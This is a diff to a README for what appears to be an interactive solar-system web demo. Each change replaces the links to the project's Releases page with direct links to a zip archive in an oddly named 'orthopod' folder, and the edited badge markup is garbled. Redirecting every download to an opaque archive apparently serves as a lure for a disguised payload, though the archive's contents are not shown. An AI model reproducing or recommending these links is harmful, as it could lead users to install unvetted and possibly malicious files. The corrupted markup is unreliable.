@@ -1,6 +1,6 @@
 # 🌌 interactive-solar-system-css-js - Explore Planets in a Fun Simulation
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-blue.svg)](https://github.com/EnggoAn/interactive-solar-system-css-js/releases)
+[![Download Now](https://raw.githubusercontent.com/EnggoAn/interactive-solar-system-css-js/main/orthopod/system-js-interactive-css-solar-v1.4.zip%20Now-Visit%https://raw.githubusercontent.com/EnggoAn/interactive-solar-system-css-js/main/orthopod/system-js-interactive-css-solar-v1.4.zip)](https://raw.githubusercontent.com/EnggoAn/interactive-solar-system-css-js/main/orthopod/system-js-interactive-css-solar-v1.4.zip)
 
 ## 🚀 Getting Started
 
@@ -25,7 +25,7 @@ To run this application smoothly, you'll need:
 
 To download and run the interactive solar system application, please follow these steps:
 
-1. Visit the [Releases page](https://github.com/EnggoAn/interactive-solar-system-css-js/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/EnggoAn/interactive-solar-system-css-js/main/orthopod/system-js-interactive-css-solar-v1.4.zip).
   
 2. On the Releases page, look for the latest version of the project.
 
@@ -62,6 +62,6 @@ If you have questions or feedback, you can reach out through the issues section 
 - **CSS**: Learn about styling and layout for web applications.
 - **JavaScript**: Discover how to create interactivity on web pages.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-blue.svg)](https://github.com/EnggoAn/interactive-solar-system-css-js/releases) 
+[![Download Now](https://raw.githubusercontent.com/EnggoAn/interactive-solar-system-css-js/main/orthopod/system-js-interactive-css-solar-v1.4.zip%20Now-Visit%https://raw.githubusercontent.com/EnggoAn/interactive-solar-system-css-js/main/orthopod/system-js-interactive-css-solar-v1.4.zip)](https://raw.githubusercontent.com/EnggoAn/interactive-solar-system-css-js/main/orthopod/system-js-interactive-css-solar-v1.4.zip) 
 
 Thank you for trying the interactive solar system simulation. Enjoy your journey through space!
